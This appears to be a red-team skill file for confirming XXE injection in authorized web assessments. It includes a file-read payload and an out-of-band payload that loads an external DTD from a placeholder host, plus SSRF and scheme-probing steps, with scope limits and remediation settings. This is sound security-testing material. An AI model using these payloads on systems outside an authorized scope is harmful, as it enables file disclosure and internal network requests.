---
name: web-xxe
description: >-
  Confirm and characterize XML external entity (XXE) injection in a web
  application during an authorized assessment. Use when an endpoint parses
  user-supplied XML (SOAP, SAML, SVG, DOCX/XLSX, RSS, config uploads) and you
  need to prove file read or SSRF via external entities without exfiltrating
  sensitive data.
version: 1.0.0
team: red
app_type: web-app
killchain:
  framework: mitre-attack
  stage: initial-access
techniques:
  attack: [T1190]
  capec: [CAPEC-201]
  cwe: [CWE-611]
  owasp: ["A05:2021"]
  d3fend: []
pairs_with: [web-xxe-hardening]
risk:
  level: high
  reversible: true
  data_touch: read
authorization: required
maturity: validated
validation:
  method: lab
  target: owasp-juice-shop
  last_validated: 2026-07-28
  validated_by: praneeth132006
license: Apache-2.0
---

# Web XML external entity (XXE) injection

## Overview

XXE occurs when an XML parser resolves external entities defined in
attacker-controlled input, enabling local file disclosure, SSRF, and sometimes
denial of service. This skill confirms entity resolution with a benign marker
file or an out-of-band callback, distinguishing in-band (reflected) from blind
XXE, and characterizes reachable protocols — without dumping secrets.

## Authorization & scope

**Run only against systems you are explicitly authorized to test.** Prove file
read with a **non-sensitive** file (`/etc/hostname`) or an OOB DNS/HTTP hit, not
by exfiltrating keys or credentials. Avoid entity-expansion (billion-laughs) DoS
payloads against shared or production systems. Confirm the endpoint and any
internal targets are in written scope.

## Preconditions

- An endpoint that accepts and parses XML: SOAP/REST XML bodies, SAML responses,
  SVG or Office-document uploads, RSS/XML importers, sitemap parsers.
- Ability to observe responses and, for blind cases, an OOB listener you control.

## Procedure

1. **Baseline.** Send well-formed XML the endpoint expects and confirm normal
   processing.
2. **In-band file read.** Define an external entity pointing at a benign file and
   reference it where output is reflected:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
   <root><name>&xxe;</name></root>
   ```
   The hostname appearing in the response confirms in-band XXE.
3. **Blind / OOB confirmation** when nothing is reflected — resolve an external
   DTD from a host you control and watch for the callback:
   ```xml
   <!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://rbsk.oob.YOURHOST/e.dtd"> %ext; ]>
   ```
4. **SSRF via XXE.** Point `SYSTEM` at an in-scope internal URL to confirm the
   parser makes server-side requests (reachability only).
5. **Characterize the parser.** Note which schemes resolve (`file`, `http`,
   `php://`, `jar:`, `expect://`), and whether parameter entities are needed to
   bypass filtering.
6. **Prove impact minimally.** One benign file read or one OOB hit is enough. Do
   not read secrets or run expansion DoS.
7. **Record** the endpoint, working payload, in-band vs blind, reachable schemes,
   and remediation (disable DTDs/external entities; set parser features
   `disallow-doctype-decl`, `external-general-entities=false`).

## Paired defense / offense

Pairs with **web-xxe-hardening**. Inbound XML containing `<!DOCTYPE`/`<!ENTITY`
`SYSTEM`, outbound DNS/HTTP from the parser to attacker hosts, and file-access by
the XML-processing service are the detection/prevention surface. When validating
together, confirm the hardened parser rejects the DOCTYPE and no callback fires.

## Validation

Reproduce in `_lab/`:

1. Bring up a target that parses XML uploads (`docker compose up -d`).
2. Submit the in-band payload from step 2 with a benign `file://` target and
   confirm the file contents are reflected.
3. Submit the OOB payload from step 3 and confirm the inbound hit on your
   listener, proving blind XXE.

## References

- OWASP: XML External Entity Prevention Cheat Sheet; A05:2021
- MITRE ATT&CK T1190 — Exploit Public-Facing Application
- CWE-611 — Improper Restriction of XML External Entity Reference
- PortSwigger Web Security Academy — XXE injection
